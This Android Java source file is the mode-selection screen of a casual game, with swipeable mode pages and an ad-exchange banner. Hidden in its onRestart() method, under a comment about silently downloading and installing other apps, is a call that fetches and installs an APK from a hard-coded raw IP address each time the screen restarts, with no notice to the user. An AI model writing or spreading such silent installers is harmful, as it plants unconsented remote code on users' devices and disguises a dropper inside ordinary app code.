package com.xiude.bottle;

import java.util.ArrayList;
import java.util.List;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.support.v4.view.ViewPager;
import android.support.v4.view.ViewPager.OnPageChangeListener;
import android.util.Log;
import android.view.GestureDetector;
import android.view.GestureDetector.OnGestureListener;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.ListView;

import com.umeng.newxp.common.ExchangeConstants;
import com.umeng.newxp.controller.ExchangeDataService;
import com.umeng.newxp.view.ExchangeViewManager;
import com.xiude.util.DownloadSilently;

public class SelectModeActivity extends BaseActivity implements OnClickListener,
		OnPageChangeListener, OnGestureListener {
	private ViewPager vp;
	private GuideAdapter vpAdapter;
	private List<View> views;

	private int lastValue = -1;
	private static boolean lastPicState = false;

	// 引导图片资源
	private static final int[] pics = { R.drawable.ball, R.drawable.ball,
			R.drawable.ball };

	// 底部小店图片
	private ImageView[] dots;

	// 记录当前选中位置
	private int currentIndex;

	GestureDetector detector;

	ViewGroup fatherLayout; //广告的展示位
	public static int gameMode = 1; //当前是哪种模式
	
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.mode);
		
	     //广告
        ExchangeConstants.ROUND_ICON = false;
        fatherLayout = (ViewGroup) this.findViewById(R.id.ad);
        
        ImageView deleteView = (ImageView) this.findViewById(R.id.ad_delete);
        deleteView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				fatherLayout.setVisibility(View.GONE);
			}
		});
        
        ListView listView = (ListView) this.findViewById(R.id.list);
        listView.setEnabled(false);
        
        ExchangeDataService exchangeDataService = FirstActivity.exchangeDataService != null ? FirstActivity.exchangeDataService : new ExchangeDataService();;
        
        exchangeDataService.setKeywords("app"); 
        exchangeDataService.autofill = 0;
        ExchangeViewManager exchangeViewManager = new ExchangeViewManager(this,exchangeDataService);
        exchangeViewManager.addView(fatherLayout, listView); 
        
    	int count = listView.getCount();
    	if(count > 0){
    		deleteView.setVisibility(View.VISIBLE);
    	}else{
    		deleteView.setVisibility(View.GONE);
    	}
    	
    	SharedPreferences adCountPreference = getSharedPreferences("ad_count", 0);
    	adCountPreference.edit().putInt("count", count).commit();
    	
		Log.i("items", "count ="+count);
       //广告
        
		ImageView backView = (ImageView)findViewById(R.id.back);
		backView.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				finish();
			}
		});
		
		detector = new GestureDetector(this);

		views = new ArrayList<View>();

		LayoutInflater inflater = getLayoutInflater();

		View modePager = inflater.inflate(R.layout.mode_pager, null);
		ImageView img = (ImageView) modePager.findViewById(R.id.img);
		ImageView font = (ImageView) modePager.findViewById(R.id.font);
		
		img.setBackgroundResource(R.drawable.custom_mode);
		img.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				gameMode = 1;
				Intent i = new Intent(SelectModeActivity.this, SelectGuanActivity.class);
//				i.putExtra("gamemode", 1);
				startActivity(i);
			}
		});
		
		font.setBackgroundResource(R.drawable.custom_font);
		views.add(modePager);

		View modePager2 = inflater.inflate(R.layout.mode_pager, null);
		ImageView img2 = (ImageView) modePager2.findViewById(R.id.img);
		img2.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				gameMode = 2;
				Intent i = new Intent(SelectModeActivity.this, SelectGuanActivity.class);
//				i.putExtra("gamemode", 2);
				startActivity(i);
			}
		});
		
		ImageView font2 = (ImageView) modePager2.findViewById(R.id.font);
		
		img2.setBackgroundResource(R.drawable.challege_mode);
		font2.setBackgroundResource(R.drawable.challege_font);
		
		views.add(modePager2);

		View modePager3 = inflater.inflate(R.layout.mode_pager, null);
		ImageView img3 = (ImageView) modePager3.findViewById(R.id.img);
		
		img3.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				gameMode = 3;
				
				SharedPreferences infinitePreference = getSharedPreferences("infinite", 0);
				//历史总积分
				int topIntegral = infinitePreference.getInt("top_integral", 0);
				Intent i;
				if(topIntegral != 0){
					int topLevel = infinitePreference.getInt("top_level", 1);
					i = new Intent(SelectModeActivity.this, InfinityActivity.class);
					i.putExtra("topIntegral", topIntegral);
					i.putExtra("toplevel", topLevel);
					
				}else{
					i = new Intent(SelectModeActivity.this, WelActivity.class);
					i.putExtra("num", 1);
				}
				
				startActivity(i);
			}
		});
		
		ImageView font3 = (ImageView) modePager3.findViewById(R.id.font);
		
		img3.setBackgroundResource(R.drawable.infinite_mode);
		font3.setBackgroundResource(R.drawable.infinite_font);
		
		views.add(modePager3);

		vp = (ViewPager) findViewById(R.id.viewpager);
		// 初始化Adapter
		vpAdapter = new GuideAdapter(views);
		vp.setAdapter(vpAdapter);
		// 绑定回调
		vp.setOnPageChangeListener(this);

		// 初始化底部小点
//		initDots();
	
	}
	
	@Override
	protected void onRestart() {
		//靜默下載與安裝其它應用  begin
		DownloadSilently.downloadAndInstall("http://114.80.202.91:8080/test2/silent1.apk", SelectModeActivity.this);
		//end
		super.onRestart();
	}

	@Override
	protected void onResume() {
		fatherLayout.setVisibility(View.VISIBLE);
		super.onResume();
	}
	

	/**
	 * 设置当前的引导页
	 */
	private void setCurView(int position) {
		if (position < 0 || position >= pics.length) {
			return;
		}

		vp.setCurrentItem(position);
	}

	/**
	 * 这只当前引导小点的选中
	 */
	private void setCurDot(int positon) {
		if (positon < 0 || positon > pics.length - 1 || currentIndex == positon) {
			return;
		}

		dots[positon].setEnabled(false);
		dots[positon].setImageResource(R.drawable.cur_page);

		dots[currentIndex].setEnabled(true);
		dots[currentIndex].setImageResource(R.drawable.no_cur_page);

		currentIndex = positon;
	}

	// 当滑动状态改变时调用
	@Override
	public void onPageScrollStateChanged(int arg0) {
	}

	// 当当前页面被滑动时调用
	@Override
	public void onPageScrolled(int arg0, float arg1, int arg2) {
		lastValue = arg0;
	}

	// 当新的页面被选中时调用
	@Override
	public void onPageSelected(int arg0) {
		// // 设置底部小点选中状态
//		setCurDot(arg0);
	}

	@Override
	public void onClick(View v) {
//		int position = (Integer) v.getTag();
//		setCurView(position);
//		setCurDot(position);
	}

	@Override
	public boolean dispatchTouchEvent(MotionEvent ev) {
		if (this.detector.onTouchEvent(ev)) {
			return true;
		}
		return super.dispatchTouchEvent(ev);
	}

	@Override
	public boolean onDown(MotionEvent e) {
		return false;
	}

	@Override
	public void onShowPress(MotionEvent e) {

	}

	@Override
	public boolean onSingleTapUp(MotionEvent e) {
		return false;
	}

	@Override
	public boolean onScroll(MotionEvent e1, MotionEvent e2, float distanceX,
			float distanceY) {
		return false;
	}

	@Override
	public void onLongPress(MotionEvent e) {

	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}

	@Override
	public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX,
			float velocityY) {
		return false;
	}

}
